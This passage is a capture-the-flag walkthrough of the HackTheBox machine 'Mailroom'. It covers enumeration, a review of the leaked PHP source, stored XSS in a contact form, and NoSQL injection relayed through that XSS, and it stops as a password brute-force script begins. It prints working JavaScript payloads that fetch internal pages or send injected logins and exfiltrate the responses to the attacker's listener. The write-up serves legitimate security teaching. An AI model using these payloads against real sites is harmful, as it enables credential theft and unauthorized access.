---
title: HTB: Mailroom
url: https://0xdf.gitlab.io/2023/08/19/htb-mailroom.html
date: 2023-08-19T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-mailroom, hackthebox, ctf, nmap, ubuntu, debian, feroxbuster, wfuzz, gitea, subdomain, execute-after-redirect, xss, nosql-injection, nosql-injection-over-xss, xsrf, command-injection, filter, keepass, strace, trace, ptrace-scope, youtube, htb-retired, htb-fingerprint, htb-previse
---

![Mailroom](/img/mailroom-cover.png)

Mailroom has a contact us form that I can use to get cross site sripting against an admin user. I’ll use this XSS to exploit a NoSQL injection vulnerability in a private site, brute forcing the user’s password and exfiling it back to myself. From this foothold, I’ll exploit into the container running the site and find more credentials, pivoting to another user. This user is opening their KeePass database, and I’ll use strace to watch them type their password into KeePass CLI, which I can use to recover the root password. In Beyond Root, a quick dive into how the KeePass password was automated.

## Box Info

| Name | [Mailroom](https://hackthebox.com/machines/mailroom)  [Mailroom](https://hackthebox.com/machines/mailroom) [Play on HackTheBox](https://hackthebox.com/machines/mailroom) |
| --- | --- |
| Release Date | [15 Apr 2023](https://twitter.com/hackthebox_eu/status/1646528849642127361) |
| Retire Date | 19 Aug 2023 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Mailroom |
| Radar Graph | Radar chart for Mailroom |
| First Blood User | 02:19:03[Sm1l3z Sm1l3z](https://app.hackthebox.com/users/357237) |
| First Blood Root | 03:15:15[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [wyzn wyzn](https://app.hackthebox.com/users/443152) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.209
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-19 16:02 EDT
Nmap scan report for 10.10.11.209
Host is up (0.086s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.95 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.209
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-19 16:03 EDT
Nmap scan report for 10.10.11.209
Host is up (0.086s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: The Mail Room
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.93 seconds

```

The [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions are interesting. OpenSSH matches Ubuntu 20.04 focal, but Apache matches Debian 11 bullseye. The most likely scenario for Linux in Linux is that one is in a container, but it could also be a VM. The most common scenario would also be that the webserve is the container, but that’s just speculation.

### Website - TCP 80

#### Site

The site is for a shipping company:

![image-20230419160721819](/img/image-20230419160721819.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

The links across the top lead to pages like an about page with three employees, and a services page. The interesting one is the contact page:

![image-20230419161810857](/img/image-20230419161810857.png)

It says that the AI will read and reply. That’s interesting. When I submit something, a message appears above the button:

![image-20230419161900652](/img/image-20230419161900652.png)

Clicking the link leads to a page with the inquiry:

![image-20230419161921365](/img/image-20230419161921365.png)

The page also does have `mailroom.htb` in the footer:

![image-20230419161938290](/img/image-20230419161938290.png)

I’ll add that to my `/etc/hosts` file:

```
10.10.11.209 mailroom.htb

```

The site loads the same when accessed by this domain.

#### Tech Stack

The pages on the site are all `.php` extension. The HTTP response headers confirm:

```

HTTP/1.1 200 OK
Date: Wed, 19 Apr 2023 20:06:41 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Vary: Accept-Encoding
Content-Length: 7748
Connection: close
Content-Type: text/html; charset=UTF-8

```

There’s no evidence of any kind of framework.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://mailroom.htb -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://mailroom.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      310c http://mailroom.htb/css => http://mailroom.htb/css/
200      GET       75l      321w     4336c http://mailroom.htb/services.php
200      GET      320l     1728w   209928c http://mailroom.htb/assets/favicon.ico
200      GET        7l     1031w    78135c http://mailroom.htb/js/bootstrap.bundle.min.js
200      GET      118l      394w     6891c http://mailroom.htb/about.php
200      GET      128l      534w     7748c http://mailroom.htb/index.php
200      GET    11300l    21361w   206710c http://mailroom.htb/css/styles.css
200      GET      128l      534w     7748c http://mailroom.htb/
301      GET        9l       28w      313c http://mailroom.htb/assets => http://mailroom.htb/assets/
301      GET        9l       28w      317c http://mailroom.htb/javascript => http://mailroom.htb/javascript/
200      GET       86l      271w     4317c http://mailroom.htb/contact.php
301      GET        9l       28w      309c http://mailroom.htb/js => http://mailroom.htb/js/
200      GET     1345l     6662w    64933c http://mailroom.htb/font/bootstrap-icons.css
301      GET        9l       28w      311c http://mailroom.htb/font => http://mailroom.htb/font/
301      GET        9l       28w      324c http://mailroom.htb/javascript/jquery => http://mailroom.htb/javascript/jquery/
200      GET    10870l    44283w   287600c http://mailroom.htb/javascript/jquery/jquery
301      GET        9l       28w      316c http://mailroom.htb/inquiries => http://mailroom.htb/inquiries/
[####################] - 8m    344103/344103  0s      found:17      errors:10445
[####################] - 7m     43008/43008   91/s    http://mailroom.htb/
[####################] - 7m     43008/43008   91/s    http://mailroom.htb/css/
[####################] - 7m     43008/43008   92/s    http://mailroom.htb/assets/
[####################] - 8m     43008/43008   89/s    http://mailroom.htb/javascript/
[####################] - 8m     43008/43008   89/s    http://mailroom.htb/js/
[####################] - 7m     43008/43008   90/s    http://mailroom.htb/font/
[####################] - 7m     43008/43008   91/s    http://mailroom.htb/javascript/jquery/
[####################] - 7m     43008/43008   99/s    http://mailroom.htb/inquiries/

```

It finds a bunch of pages, but nothing that jumps out as interesting or different from what I’ve already looked at manually.

### Subdomain Brute Force

Given the reference to `mailroom.htb`, I’ll fuzz for any subdomains that respond differently:

```

oxdf@hacky$ wfuzz -u http://10.10.11.209 -H "Host: FUZZ.mailroom.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hh 7746
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.209/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000262:   200        267 L    1181 W     13089 Ch    "git"

Total time: 0
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 0

```

It finds one, so I’ll add `git.mailroom.htb` to my `hosts` file.

### git.mailroom.htb - TCP 80

#### Site

The site is an instance of Gitea:

![image-20230419164903573](/img/image-20230419164903573.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

The version is 1.18.0, which was [released](https://github.com/go-gitea/gitea/releases/tag/v1.18.0) on December 29, 2022:

![image-20230419165204964](/img/image-20230419165204964.png)

A skim through the releases since then doesn’t show any obvious vulnerabilities, and this is around when Mailroom was submitted to HTB, so it’s likely not intended to be vulnerable to a known exploit.

Clicking “Explore”, there’s one public repo:

![image-20230419164943735](/img/image-20230419164943735.png)

The Users page has three users:

![image-20230420181808065](/img/image-20230420181808065.png)

I’ll note the names administrator, matthew, and tristan for later.

#### staffroom

There’s the source for a PHP website here:

![image-20230419171600904](/img/image-20230419171600904.png)

Looking at `index.php`, it is definitely not a match with the main site I have accessed already.

[![image-20230419174711670](/img/image-20230419174711670.png)*Click for full size image*](/img/image-20230419174711670.png)

In `auth.php`, there’s a reference to a full domain:

[![image-20230419174819985](/img/image-20230419174819985.png)*Click for full size image*](/img/image-20230419174819985.png)

I’ll come back to this code more later.

### staff-review-panel.mailroom.htb - TCP 80

Visiting this site return 403 forbidden:

![image-20230419170950730](/img/image-20230419170950730.png)

I’m not able to access this from localhost. There’s no evidence of a 403 returned from the PHP source, and everything I try returns 403, so it seems like it’s blocked at the Apache level.

## Shell as tristan

### XSS in Contact Form

#### POC Inquiry View

The `mailroom.htb` site has a contact form and I’ll want to check that for cross site scripting (XSS). I’ll start with some simple bold tags. Trying to add one in the email fails client side validation (I can bypass that, but I’ll start without it):

![image-20230420170252171](/img/image-20230420170252171.png)

On submitting, checking out the returned link, “test” is in bold:

![image-20230420170317817](/img/image-20230420170317817.png)

It’s certainly possible that the user / AI is viewing it through a different form, but this seems like a good time to explore XSS.

#### Remote POC

I’ll start a webserver and send a `script` tag that will try to load JavaScript from my host:

![image-20230420170540506](/img/image-20230420170540506.png)

After sending, before I can even view it myself, there’s a hit on my webserver (`python -m http.server 80`) from Mailroom:

```
10.10.11.209 - - [20/Apr/2023 17:05:40] code 404, message File not found
10.10.11.209 - - [20/Apr/2023 17:05:40] "GET /test.js HTTP/1.1" 404 -

```

#### Remote Enumeration

To enumerate from here, I’ll write a series of different JavaScript files to load over this. I’ll keep changing the name to keep a history of what I tried. Then I can go into Burp Repeater and change the name of the requested file and submit the POST to `/contact.php` and view the response.

I’ll pull the url of the page that’s viewing the request:

```

var url = window.location.href
var req = new XMLHttpRequest()
req.open("GET", "http://10.10.14.6/?resp=" + btoa(url), true);
req.send()

```

On sending, it comes back:

```
10.10.11.209 - - [20/Apr/2023 17:11:26] "GET /location.js HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 17:11:26] "GET /?resp=aHR0cDovLzEyNy4wLjAuMS9pbnF1aXJpZXMvNTY5NjNmMzM2NjAxYjAyMWNkMDM5YzQxZWQwMjZkMTguaHRtbA== HTTP/1.1" 200 -

```

Decoding that shows it’s viewing the same page that I am:

```

oxdf@hacky$ echo "aHR0cDovLzEyNy4wLjAuMS9pbnF1aXJpZXMvNTY5NjNmMzM2NjAxYjAyMWNkMDM5YzQxZWQwMjZkMTguaHRtbA==" | base64 -d
http://127.0.0.1/inquiries/56963f336601b021cd039c41ed026d18.html

```

It also shows that the JavaScript I load can send back requests to me.

Can I load `staff-review-panel.mailroom.htb`? This code will try:

```

var req = new XMLHttpRequest()
req.open("GET", "http://staff-review-panel.mailroom.htb", false);
req.send()

var exfil_req = new XMLHttpRequest()
exfil_req.open("GET", "http://10.10.14.6/?resp=" + btoa(req.responseText), true);
exfil_req.send()

```

The first request is getting the contents of the page, and then the second request is sending the response text back base64-encoded as a GET parameter. Send, and there’s a hit:

```
10.10.11.209 - - [20/Apr/2023 17:16:41] "GET /staffpage.js HTTP/1.1" 200 -
10.10.11.209 - - [20/Apr/2023 17:16:41] "GET /?resp=CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+Cgo8aGVhZD4KICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCIgLz4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iIC8+CiAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiIgLz4KICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IiIgLz4KICA8dGl0bGU+SW5xdWlyeSBSZXZpZXcgUGFuZWw8L3RpdGxlPgogIDwhLS0gRmF2aWNvbi0tPgogIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJhc3NldHMvZmF2aWNvbi5pY28iIC8+CiAgPCEtLSBCb290c3RyYXAgaWNvbnMtLT4KICA8bGluayBocmVmPSJmb250L2Jvb3RzdHJhcC1pY29ucy5jc3MiIHJlbD0ic3R5bGVzaGVldCIgLz4KICA8IS0tIENvcmUgdGhlbWUgQ1NTIChpbmNsdWRlcyBCb290c3RyYXApLS0+CiAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCIgLz4KPC9oZWFkPgoKPGJvZHk+CiAgPGRpdiBjbGFzcz0id3JhcHBlciBmYWRlSW5Eb3duIj4KICAgIDxkaXYgaWQ9ImZvcm1Db250ZW50Ij4KCiAgICAgIDwhLS0gTG9naW4gRm9ybSAtLT4KICAgICAgPGZvcm0gaWQ9J2xvZ2luLWZvcm0nIG1ldGhvZD0iUE9TVCI+CiAgICAgICAgPGgyPlBhbmVsIExvZ2luPC9oMj4KICAgICAgICA8aW5wdXQgcmVxdWlyZWQgdHlwZT0idGV4dCIgaWQ9ImVtYWlsIiBjbGFzcz0iZmFkZUluIHNlY29uZCIgbmFtZT0iZW1haWwiIHBsYWNlaG9sZGVyPSJFbWFpbCI+CiAgICAgICAgPGlucHV0IHJlcXVpcmVkIHR5cGU9InBhc3N3b3JkIiBpZD0icGFzc3dvcmQiIGNsYXNzPSJmYWRlSW4gdGhpcmQiIG5hbWU9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJmYWRlSW4gZm91cnRoIiB2YWx1ZT0iTG9nIEluIj4KICAgICAgICA8cCBoaWRkZW4gaWQ9Im1lc3NhZ2UiIHN0eWxlPSJjb2xvcjogIzhGOEY4RiI+T25seSBzaG93IHRoaXMgbGluZSBpZiByZXNwb25zZSAtIGVkaXQgY29kZTwvcD4KICAgICAgPC9mb3JtPgoKICAgICAgPCEtLSBSZW1pbmQgUGFzc293cmQgLS0+CiAgICAgIDxkaXYgaWQ9ImZvcm1Gb290ZXIiPgogICAgICAgIDxhIGNsYXNzPSJ1bmRlcmxpbmVIb3ZlciIgaHJlZj0icmVnaXN0ZXIuaHRtbCI+Q3JlYXRlIGFuIGFjY291bnQ8L2E+CiAgICAgIDwvZGl2PgoKICAgIDwvZGl2PgogIDwvZGl2PgoKICA8IS0tIEJvb3RzdHJhcCBjb3JlIEpTLS0+CiAgPHNjcmlwdCBzcmM9ImpzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIj48L3NjcmlwdD4KCiAgPCEtLSBMb2dpbiBGb3JtLS0+CiAgPHNjcmlwdD4KICAgIC8vIEdldCB0aGUgZm9ybSBlbGVtZW50CiAgICBjb25zdCBmb3JtID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luLWZvcm0nKTsKCiAgICAvLyBBZGQgYSBzdWJtaXQgZXZlbnQgbGlzdGVuZXIgdG8gdGhlIGZvcm0KICAgIGZvcm0uYWRkRXZlbnRMaXN0ZW5lcignc3VibWl0JywgZXZlbnQgPT4gewogICAgICAvLyBQcmV2ZW50IHRoZSBkZWZhdWx0IGZvcm0gc3VibWlzc2lvbgogICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwoKICAgICAgLy8gU2VuZCBhIFBPU1QgcmVxdWVzdCB0byB0aGUgbG9naW4ucGhwIHNjcmlwdAogICAgICBmZXRjaCgnL2F1dGgucGhwJywgewogICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgIGJvZHk6IG5ldyBVUkxTZWFyY2hQYXJhbXMobmV3IEZvcm1EYXRhKGZvcm0pKSwKICAgICAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJyB9CiAgICAgIH0pLnRoZW4ocmVzcG9uc2UgPT4gewogICAgICAgIHJldHVybiByZXNwb25zZS5qc29uKCk7CgogICAgICB9KS50aGVuKGRhdGEgPT4gewogICAgICAgIC8vIERpc3BsYXkgdGhlIG5hbWUgYW5kIG1lc3NhZ2UgaW4gdGhlIHBhZ2UKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWVzc2FnZScpLnRleHRDb250ZW50ID0gZGF0YS5tZXNzYWdlOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZCcpLnZhbHVlID0gJyc7CiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21lc3NhZ2UnKS5yZW1vdmVBdHRyaWJ1dGUoImhpZGRlbiIpOwogICAgICB9KS5jYXRjaChlcnJvciA9PiB7CiAgICAgICAgLy8gRGlzcGxheSBhbiBlcnJvciBtZXNzYWdlCiAgICAgICAgLy9hbGVydCgnRXJyb3I6ICcgKyBlcnJvcik7CiAgICAgIH0pOwogICAgfSk7CiAgPC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPg== HTTP/1.1" 200 -

```

That decodes to a webpage:

```

oxdf@hacky$ echo "CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+Cgo8aGVhZD4KICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCIgLz4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iIC8+CiAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiIgLz4KICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IiIgLz4KICA8dGl0bGU+SW5xdWlyeSBSZXZpZXcgUGFuZWw8L3RpdGxlPgogIDwhLS0gRmF2aWNvbi0tPgogIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJhc3NldHMvZmF2aWNvbi5pY28iIC8+CiAgPCEtLSBCb290c3RyYXAgaWNvbnMtLT4KICA8bGluayBocmVmPSJmb250L2Jvb3RzdHJhcC1pY29ucy5jc3MiIHJlbD0ic3R5bGVzaGVldCIgLz4KICA8IS0tIENvcmUgdGhlbWUgQ1NTIChpbmNsdWRlcyBCb290c3RyYXApLS0+CiAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCIgLz4KPC9oZWFkPgoKPGJvZHk+CiAgPGRpdiBjbGFzcz0id3JhcHBlciBmYWRlSW5Eb3duIj4KICAgIDxkaXYgaWQ9ImZvcm1Db250ZW50Ij4KCiAgICAgIDwhLS0gTG9naW4gRm9ybSAtLT4KICAgICAgPGZvcm0gaWQ9J2xvZ2luLWZvcm0nIG1ldGhvZD0iUE9TVCI+CiAgICAgICAgPGgyPlBhbmVsIExvZ2luPC9oMj4KICAgICAgICA8aW5wdXQgcmVxdWlyZWQgdHlwZT0idGV4dCIgaWQ9ImVtYWlsIiBjbGFzcz0iZmFkZUluIHNlY29uZCIgbmFtZT0iZW1haWwiIHBsYWNlaG9sZGVyPSJFbWFpbCI+CiAgICAgICAgPGlucHV0IHJlcXVpcmVkIHR5cGU9InBhc3N3b3JkIiBpZD0icGFzc3dvcmQiIGNsYXNzPSJmYWRlSW4gdGhpcmQiIG5hbWU9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJmYWRlSW4gZm91cnRoIiB2YWx1ZT0iTG9nIEluIj4KICAgICAgICA8cCBoaWRkZW4gaWQ9Im1lc3NhZ2UiIHN0eWxlPSJjb2xvcjogIzhGOEY4RiI+T25seSBzaG93IHRoaXMgbGluZSBpZiByZXNwb25zZSAtIGVkaXQgY29kZTwvcD4KICAgICAgPC9mb3JtPgoKICAgICAgPCEtLSBSZW1pbmQgUGFzc293cmQgLS0+CiAgICAgIDxkaXYgaWQ9ImZvcm1Gb290ZXIiPgogICAgICAgIDxhIGNsYXNzPSJ1bmRlcmxpbmVIb3ZlciIgaHJlZj0icmVnaXN0ZXIuaHRtbCI+Q3JlYXRlIGFuIGFjY291bnQ8L2E+CiAgICAgIDwvZGl2PgoKICAgIDwvZGl2PgogIDwvZGl2PgoKICA8IS0tIEJvb3RzdHJhcCBjb3JlIEpTLS0+CiAgPHNjcmlwdCBzcmM9ImpzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIj48L3NjcmlwdD4KCiAgPCEtLSBMb2dpbiBGb3JtLS0+CiAgPHNjcmlwdD4KICAgIC8vIEdldCB0aGUgZm9ybSBlbGVtZW50CiAgICBjb25zdCBmb3JtID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luLWZvcm0nKTsKCiAgICAvLyBBZGQgYSBzdWJtaXQgZXZlbnQgbGlzdGVuZXIgdG8gdGhlIGZvcm0KICAgIGZvcm0uYWRkRXZlbnRMaXN0ZW5lcignc3VibWl0JywgZXZlbnQgPT4gewogICAgICAvLyBQcmV2ZW50IHRoZSBkZWZhdWx0IGZvcm0gc3VibWlzc2lvbgogICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwoKICAgICAgLy8gU2VuZCBhIFBPU1QgcmVxdWVzdCB0byB0aGUgbG9naW4ucGhwIHNjcmlwdAogICAgICBmZXRjaCgnL2F1dGgucGhwJywgewogICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgIGJvZHk6IG5ldyBVUkxTZWFyY2hQYXJhbXMobmV3IEZvcm1EYXRhKGZvcm0pKSwKICAgICAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJyB9CiAgICAgIH0pLnRoZW4ocmVzcG9uc2UgPT4gewogICAgICAgIHJldHVybiByZXNwb25zZS5qc29uKCk7CgogICAgICB9KS50aGVuKGRhdGEgPT4gewogICAgICAgIC8vIERpc3BsYXkgdGhlIG5hbWUgYW5kIG1lc3NhZ2UgaW4gdGhlIHBhZ2UKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWVzc2FnZScpLnRleHRDb250ZW50ID0gZGF0YS5tZXNzYWdlOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZCcpLnZhbHVlID0gJyc7CiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21lc3NhZ2UnKS5yZW1vdmVBdHRyaWJ1dGUoImhpZGRlbiIpOwogICAgICB9KS5jYXRjaChlcnJvciA9PiB7CiAgICAgICAgLy8gRGlzcGxheSBhbiBlcnJvciBtZXNzYWdlCiAgICAgICAgLy9hbGVydCgnRXJyb3I6ICcgKyBlcnJvcik7CiAgICAgIH0pOwogICAgfSk7CiAgPC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPg==" | base64 -d

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
  <meta name="description" content="" />
  <meta name="author" content="" />
  <title>Inquiry Review Panel</title>
  <!-- Favicon-->
  <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
  <!-- Bootstrap icons-->
  <link href="font/bootstrap-icons.css" rel="stylesheet" />
...[snip]...

```

That matches the code in `index.php` in the repo on Gitea.

### Staffroom Source

#### index.php

At this point, it’s worth some time to take a deeper look at the source for the staffroom site. The `index.php` has a login form in the middle:

```

      <!-- Login Form -->
      <form id='login-form' method="POST">
        <h2>Panel Login</h2>
        <input required type="text" id="email" class="fadeIn second" name="email" placeholder="Email">
        <input required type="password" id="password" class="fadeIn third" name="password" placeholder="Password">
        <input type="submit" class="fadeIn fourth" value="Log In">
        <p hidden id="message" style="color: #8F8F8F">Only show this line if response - edit code</p>
      </form>

```

Javascript a bit further down generates the POST request to `/auth.php`:

```

    // Add a submit event listener to the form
    form.addEventListener('submit', event => {
      // Prevent the default form submission
      event.preventDefault();

      // Send a POST request to the login.php script
      fetch('/auth.php', {
        method: 'POST',
        body: new URLSearchParams(new FormData(form)),
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      }).then(response => {
        return response.json();

      }).then(data => {
        // Display the name and message in the page
        document.getElementById('message').textContent = data.message;
        document.getElementById('password').value = '';
        document.getElementById('message').removeAttribute("hidden");
      }).catch(error => {
        // Display an error message
        //alert('Error: ' + error);
      });
    });

```

#### auth.php

Taking a look at `auth.php`, it starts by getting a connection to a MongoDB instance:

```

session_start(); // Start a session
$client = new MongoDB\Client("mongodb://mongodb:27017"); // Connect to the MongoDB database
header('Content-Type: application/json');
if (!$client) {
  header('HTTP/1.1 503 Service Unavailable');
  echo json_encode(['success' => false, 'message' => 'Failed to connect to the database']);
  exit;
}
$collection = $client->backend_panel->users; // Select the users collection

```

If the `email` and `password` POST parameters are set, it has code for checking login. First, it validates that both parameters are strings:

```

  // Verify the parameters are valid
  if (!is_string($_POST['email']) || !is_string($_POST['password'])) {
    header('HTTP/1.1 401 Unauthorized');
    echo json_encode(['success' => false, 'message' => 'Invalid input detected']);
  }

```

This is clearly trying to block NoSQL injection. However, it doesn’t `die()` or exit, so despite echoing a failure message, it will continue even with non-string inputs. This is a twist on an [execute after redirect (EAR) vulnerability](https://owasp.org/www-community/attacks/Execution_After_Redirect_(EAR)) (twist because it’s not returning a redirect, but rather just a 401, but otherwise it’s exactly the same). I’ve looked at EAR vulnerabilities in [Retired](/2022/08/13/htb-retired.html#alternative-read---ear), [Fingerprint](/2022/05/14/htb-fingerprint.html#admin), and [Previse](/2022/01/08/htb-previse.html#ear-vuln) in the past.

After this check, it queries the DB for a user, and if it finds one, it does some 2FA generation, and if not, it returns failure:

```

  // Check if the email and password are correct
  $user = $collection->findOne(['email' => $_POST['email'], 'password' => $_POST['password']]);

  if ($user) {
    // Generate a random UUID for the 2FA token
...[snip]...
    // Return a JSON response notifying about 2fa
    echo json_encode(['success' => true, 'message' => 'Check your inbox for an email with your 2FA token']);
    exit;

  } else {
    // Return a JSON error response
    header('HTTP/1.1 401 Unauthorized');
    echo json_encode(['success' => false, 'message' => 'Invalid email or password']);
  }
}

```

This should absolutely be NoSQL injectable.

### NoSQL via XSS/XSRF

#### Strategy

I’m going to use the XSS to send a POST request to the staffroom site trying to login using a NoSQL injection. When building payloads for XSS, it’s important to build in small steps, as little JavaScript errors will result in silent failures.

If I were doing this in the real world, I would stand up an instance of the PHP site in Gitea and practice what I’m about to try locally to make sure it works before risking a malicious payload. On HackTheBox, I can trigger XSS many times without issue, so I’ll just test slowly there.

#### Failed Login

To start, I’ll first try to just send a failed login to the site with no NoSQL injection:

```

var req = new XMLHttpRequest();
req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send("email=0xdf@mailroom.htb&password=0xdf");

var exfil_req = new XMLHttpRequest();
exfil_req.open("GET", "http://10.10.14.6/?resp=" + btoa(req.responseText), true);
exfil_req.send();

```

I’m not going to show the response at the webserver or the base64 decode anymore, but it’ll look the same as previous attempts. The decoded response has the expected JSON:

```

{"success":false,"message":"Invalid email or password"}

```

#### NoSQL POC

Next I’ll try to inject:

```

var req = new XMLHttpRequest();
req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send("email[$ne]=0xdf@mailroom.htb&password[$ne]=0xdf");

var exfil_req = new XMLHttpRequest();
exfil_req.open("GET", "http://10.10.14.6/?resp=" + btoa(req.responseText), true);
exfil_req.send();

```

I’ve only changed the POST body to now be looking for an email that is not equal to “0xdf@mailroom.htb” and a password that is not “0xdf”. Sending that returns two JSON blobs:

```

{"success":false,"message":"Invalid input detected"}{"success":true,"message":"Check your inbox for an email with your 2FA token"}

```

That’s because it fails the `is_string` check, and sets the header to 401, but with the EAR-ish vulnerability, it then runs the injection anyway and successfully matches on a user.

#### Enumerate Emails

I know the email “0xdf@mailroom.htb” isn’t in the DB, as the injection above worked. If I update the payload to only inject on the password with that email, it returns the `is_string` failure, a warning for trying to modify the response header a second time, and the login failure:

```

{"success":false,"message":"Invalid input detected"}<br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/staffroom/auth.php:20) in <b>/var/www/staffroom/auth.php</b> on line <b>51</b><br />
{"success":false,"message":"Invalid email or password"}

```

Replacing “0xdf” with “administrator” (to match the username on the users page) or “matthew”, the response is the same. However, when I change it to “tristan”, the response is one failure and then success:

```

{"success":false,"message":"Invalid input detected"}{"success":true,"message":"Check your inbox for an email with your 2FA token"}

```

That shows that the email address “tristan@mailroom.htb” is registered on the site.

#### Get tristan’s Password

There’s not much I can do with the login. On login, it generates a unique code and emails it to the user. However, I can brute force tristen’s password using `password[$regex]=`.

This script took a ton of troubleshooting in the browser console and ChatGTP to get working. The end product is:

```

var password = "";
